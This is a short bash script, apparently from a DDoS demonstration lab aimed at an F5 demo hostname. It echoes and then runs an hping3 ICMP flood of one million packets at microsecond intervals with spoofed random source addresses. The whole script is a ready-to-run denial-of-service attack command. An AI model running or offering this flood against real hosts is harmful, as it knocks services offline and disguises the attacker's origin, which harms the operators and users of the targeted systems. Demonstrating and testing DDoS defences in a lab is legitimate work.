#!/bin/bash
echo "Starting ICMP Flood:  hping3 -I eth1 -c 1000000 --icmp -i u1 --rand-source demosite.f5demo.com"
hping3 -I eth1 -c 1000000 --icmp -i u1 --rand-source demosite.f5demo.com
